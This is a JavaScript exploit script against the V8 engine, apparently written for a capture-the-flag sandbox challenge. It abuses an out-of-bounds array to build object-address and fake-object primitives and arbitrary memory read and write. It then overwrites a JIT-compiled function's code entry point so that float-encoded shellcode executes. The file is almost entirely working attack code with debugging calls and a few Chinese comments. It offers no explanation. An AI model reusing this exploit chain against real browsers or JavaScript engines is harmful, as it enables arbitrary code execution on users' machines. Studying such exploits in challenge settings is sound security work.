let shellcode = () => {
    return [
        1.930800574428816e-246,
        1.9710610293119303e-246,
        1.9580046981136086e-246,
        1.9533830734556562e-246,
        1.961642575273437e-246,
        1.9399842868403466e-246,
        1.9627709291878714e-246,
        1.9711826272864685e-246,
        1.9954775598492772e-246,
        2.000505685241573e-246,
        1.9535148279508375e-246,
        1.9895153917617124e-246,
        1.9539853963090317e-246,
        1.9479373016495106e-246,
        1.97118242283721e-246,
        1.95323825426926e-246,
        1.99113905582155e-246,
        1.9940808572858186e-246,
        1.9537941682504095e-246,
        1.930800151635891e-246,
        1.932214185322047e-246
    ];
};

for (let i = 0; i < 0x40000; i++) {
    shellcode();
}

const array_buffer = new ArrayBuffer(8);
let data_view = new DataView(array_buffer);
let log = console.log;

let u2d = (value) => {
    data_view.setBigUint64(0, value);
    return data_view.getFloat64(0);
};

let d2u = (value) => {
    data_view.setFloat64(0, value);
    return data_view.getBigUint64(0);
};

let hex = (value) => {
    return '0x' + value.toString(16).padStart(16, "0");
}


let oob_arr = [.1];
let obj_arr = [{}];
let float_arr = [.1];
let rw_arr = [.1];

% DebugPrint(oob_arr);
% DebugPrint(float_arr);
% DebugPrint(obj_arr);
% DebugPrint(rw_arr);

oob_arr.len(0x12138);

// % SystemBreak();
let float_arr_map = d2u(oob_arr[13]);
let obj_arr_map = d2u(oob_arr[2]);

let offset_of = (obj) => {
    oob_arr[2] = u2d(obj_arr_map);
    obj_arr[0] = obj;
    oob_arr[2] = u2d(float_arr_map);
    return d2u(obj_arr[0]) & 0xffffffffn;
};
let fake_obj = (offset) => {
    oob_arr[13] = u2d(float_arr_map);
    float_arr[0] = u2d(offset);
    oob_arr[13] = u2d(obj_arr_map);
    return float_arr[0];
};

let a = [1, 2, 3];
log("a: ", hex(offset_of(a)));
log("a: ", fake_obj(offset_of(a)));
% DebugPrint(a);

// // 修改job(rw_arr)->elements，指向job(offset)，
// // 然后通过rw_arr[0]，读取/修改job(rw_arr)->elements[0]
let arb_read = (offset) => {
    // % SystemBreak();
    oob_arr[21] = u2d((((offset - 0x8n) | 1n) << 32n) | (d2u(oob_arr[21]) & 0xffffffffn));
    // % SystemBreak();
    return d2u(rw_arr[0]);
};
let arb_write = (offset, value) => {
    // % SystemBreak();
    oob_arr[21] = u2d((((offset - 0x8n) | 1n) << 32n) | (d2u(oob_arr[21]) & 0xffffffffn));
    // % SystemBreak();
    rw_arr[0] = u2d(value);
};

// // % SystemBreak();
log("arb_read:" + hex(arb_read(offset_of(a))));
arb_write(offset_of(a), 0xdeadbeefn);
log("arb_read:" + hex(arb_read(offset_of(a))));

log("shellcode:");
% DebugPrint(shellcode);

let sc_off = offset_of(shellcode);
log("shellcode: ", hex(sc_off));
let sc_code_off = arb_read(sc_off + 0x18n) & 0xffffffffn;
log("job(sc).code off: ", hex(sc_code_off));
let code_ep_addr = arb_read(sc_code_off + 12n);
log("code_entry_point addr: ", hex(code_ep_addr));
arb_write(sc_code_off + 12n, code_ep_addr + 0x67n);
code_ep_addr = arb_read(sc_code_off + 12n);
log("written, code_entry_point addr: ", hex(code_ep_addr));

// 执行shellcode
shellcode();

% SystemBreak();
/**
 * r --allow-natives-syntax --shell /datav8/v8test1/challs/sandbox/exp2.js
 * % SystemBreak();
 */